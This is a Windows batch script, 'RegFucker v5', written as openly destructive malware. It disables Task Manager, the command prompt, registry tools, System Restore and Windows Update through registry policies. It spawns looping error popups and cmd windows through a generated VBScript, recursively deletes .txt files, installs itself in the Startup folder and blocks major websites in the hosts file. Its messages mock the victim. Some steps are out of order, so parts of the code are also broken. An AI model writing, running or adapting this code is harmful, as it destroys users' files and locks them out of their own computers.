@echo off
title REGFUCKER
echo RegFucker v5
echo Are you really sure you want to do this? You can't go back.
echo For payload 1 to work, run as admin.
pause
echo Disabling random system components...
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskbar /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskbar /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRun /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableControlPanel /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableSystemRestore /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableWindowsUpdate /t REG_DWORD /d 1 /f
echo Random system components have been disabled. Prepare for chaos! 😈

echo Activating second phase payload...
start /min wscript.exe "RegFucker.vbs"
echo Second phase payload activated. Enjoy the relentless error messages and command prompt chaos! 😈🔥💣💥

echo Creating RegFucker.vbs...
echo Set objShell = CreateObject("WScript.Shell") > RegFucker.vbs
echo Do >> RegFucker.vbs
echo     objShell.Popup "RegFucker", 0, "Error", 16 >> RegFucker.vbs
echo     For i = 1 to 10 >> RegFucker.vbs
echo         objShell.Run "cmd.exe" >> RegFucker.vbs
echo     Next >> RegFucker.vbs
echo     WScript.Sleep 30000 >> RegFucker.vbs
echo Loop Until objShell.AppActivate("RegFucker") = True >> RegFucker.vbs
echo RegFucker.vbs created successfully.

echo Activating third phase payload...
for /r %%G in (*.txt) do (
    del "%%G"
)
ren *.txt *.reg
echo Third phase payload activated. Watch as your precious .txt files are deleted and renamed to .reg! 😈🔥💣💥

echo Activating fourth phase payload...
if not exist "RegFucker.vbs" (
    echo Error: RegFucker.vbs not found. Aborting fourth phase.
) else (
    start /min wscript.exe "RegFucker.vbs"
    echo Fourth phase payload activated. The victim is now trapped with the unclosable RegFucker script. Enjoy their eternal suffering! 😈🔥💣💥
)

echo Adding the batch file to the startup folder...
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RegFucker.bat" > nul
echo Batch file added successfully. Brace yourself for permanent chaos! 😈🔥💣💥

echo Disabling more system components...
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskbar /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
echo Additional system components have been disabled. Total chaos is now unstoppable! 😈🔥💣💥

echo Blocking popular domains...
echo 127.0.0.1 facebook.com >> %SystemRoot%\System32\drivers\etc\hosts
echo 127.0.0.1 youtube.com >> %SystemRoot%\System32\drivers\etc\hosts
echo 127.0.0.1 instagram.com >> %SystemRoot%\System32\drivers\etc\hosts
echo 127.0.0.1 twitter.com >> %SystemRoot%\System32\drivers\etc\hosts
echo 127.0.0.1 google.com >> %SystemRoot%\System32\drivers\etc\hosts
echo Popular domains blocked successfully. Enjoy the chaos! 😈🔥💣💥
